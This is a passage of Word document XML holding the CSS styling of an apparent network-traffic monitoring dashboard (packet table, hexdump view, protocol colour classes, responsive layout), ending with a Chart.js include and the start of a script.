      </w:r>
    </w:p>
    <w:p w14:paraId="473A667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border-radius: 5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267AB5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font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C95E03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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC851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1BE52D88" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4210735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.pkt-toolbar input[type="text"] {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C261F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min-width: 250px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8CDF5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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1060CFD2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D115C2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.pkt-toolbar input:focus,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E08BB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.pkt-toolbar select:focus {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400A2EA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border-color: #4a897f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AD1E3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box-shadow: 0 0 0 2px rgba(23, 125, 100, 0.11);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496C80B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outline: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6291CAE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E231B5A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73DD0E1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.pkt-btn:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027212E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#f4f7f8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4CB2B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271CFAF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5339410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.pkt-btn.primary {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56802B7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#ffffff !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E114FF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#176f66;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4935DD1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border-color: #176f66 !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326EDEA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2612BDF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44DCFD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.pkt-btn.primary:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF507A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#125c54;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F32DBA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D212448" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B79A1B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.pkt-btn.paused {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343EC9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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CD6D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#fbeff1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF3DF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border-color: #e5aeb6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC7AC2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13254112" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="173E19C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.pkt-chip {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44705AC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5px 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25589D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#6d7a84;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A9A8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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAB212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6232343" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D0CC2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.pkt-chip b {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9201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#176f66;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554DCC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4A5680C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7895558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#pktScroll {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FFB6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max-height: 56vh !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5412A3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A2907C1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="431B6C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#wsTableBody {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2AC23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#ffffff !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19691F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0F4FBCB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="016C87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.wireshark-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8A502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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443249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836DA2B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B5C97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.wireshark-row.selected td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1CFD4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#eaf3f2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052EA3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9350440" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31F0EE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.ws-TCP { color: #34704d; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F0254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.ws-UDP { color: #286b83; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D1DD9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.ws-ICMP { color: #7b5480; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2EE5C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.ws-OTHER { color: #697682; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5132517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.ws-MALICIOUS { color: var(--accent-red); background: #fff6f7; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126D4A2F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05C3A6C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.hexdump {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE1A82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#d7e1e7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FD09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#16212a;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6287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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E8F07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line-height: 1.6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435CD4C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B5B92D5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631CEC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.doc-view {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AD36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max-width: 1040px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B09BCF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26px 30px 40px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA3D7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#46535e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B82CC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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DB5F2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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DF01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border-radius: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63403E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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B8376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line-height: 1.7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6031F46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box-shadow: var(--shadow-sm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777933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FB9EF3E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B1C28D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.doc-view h2 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2256A7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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71584D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padding-bottom: 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A5E8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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC73C7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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6677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20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3206D3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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADC0CB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letter-spacing: -0.015em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E0A4A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3191174" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13BF5BF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.doc-view h3 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F370D5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margin-top: 28px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E084FF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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF0DD3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#26343e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66639E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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C6BF6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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A971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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7A56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C601032" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C5A2A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.project-summary {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A169C0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 20px 0 26px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106C854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14px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4181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#28584f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222172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#f0f7f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7843D40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border-left: 3px solid #23806f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2A05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013B51B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F1798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.architecture-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474D37E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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78666D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grid-template-columns: repeat(2, minmax(0, 1fr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C84173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gap: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427AEC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margin-top: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DD1B3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D692940" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06605F2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.arch-engine {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2F5D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min-height: 150px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462FF8E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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396D13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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289F93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#52606a;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDCE37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 #fafbfc;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110DEF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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB7E99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border-left: 3px solid #647f8c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508A47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border-radius: 5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EC027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028B5C0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64D16B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.arch-engine strong {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5102E0B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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76731CF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margin-bottom: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392B76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#25323c !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536E7B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12px !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508E27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88A6C29" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7164679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.method-tag {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E7E2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inline-block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EEFAC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margin-bottom: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28189E6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color: #60707b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5380DE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font-family: "SFMono-Regular", Consolas, monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E4F0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font-size: 9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FC7E4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font-weight: 600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8662F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letter-spacing: 0.04em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11901F9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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61178BD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F5C773E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="795771F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@media (max-width: 1180px) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABB246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.metrics-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686FAAE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grid-template-columns: repeat(2, minmax(0, 1fr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFD327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2850BEA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7526FB4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.overview-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7383BD5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grid-template-columns: 1fr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2004BD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0F4340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37CD698" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47416E5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@media (max-width: 760px) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3432F9B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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A3A4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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE4B84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height: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337D923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min-height: 100vh;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735F4A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overflow: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C8801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BE6D0FE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30EC63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.sidebar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B443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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598055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min-height: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5EF9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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7588714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E6FA304" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BCD96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.logo-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4919B2C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min-height: 64px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79ED41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12px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF311F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11041868" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6528F6B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.nav-menu {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8CC4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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0669F11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gap: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2953A54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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F9448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overflow-x: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC7BD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scrollbar-width: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B5F1E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90E67AA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28ABAD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.nav-menu::-webkit-scrollbar { display: none; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2982DE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C8E6F0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.nav-label,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F46BE2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.sidebar-session {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F9D1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none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D7EB1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76211E5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="585537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.nav-item {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583C94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width: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2726A4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flex: 0 0 auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1089EB8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white-space: nowrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161E6F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8B0A41C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B949DD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.main-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7808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min-height: calc(100vh - 122px);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEB67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overflow: visible;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EA9D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AB3C071" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CEAB7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header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338E54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min-height: 62px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763E83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10px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5751501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57964A1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D16672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.header-copy p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7F336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none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE2FAB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7B8F639" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DCAEE4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.last-updated {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D24FB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display: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC118D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0E1C8A4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50DB16B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.tab-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000259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padding: 20px 16px 28px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752A650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overflow: visible;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767292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45D3331" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="268196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.metrics-grid,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547C37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.architecture-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7BCF4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grid-template-columns: 1fr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CBBA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6C81710" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0529AD6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.pkt-toolbar input[type="text"] {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AED6A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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7108ADA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min-width: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FB0B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DF714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AD7DC0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&lt;/style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76212CD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 Include Chart.js --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C14F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&lt;script src="https://cdn.jsdelivr.net/npm/chart.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200D17A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&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3151BFF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allAlerts = [];</w:t>
      </w:r>
    </w:p>
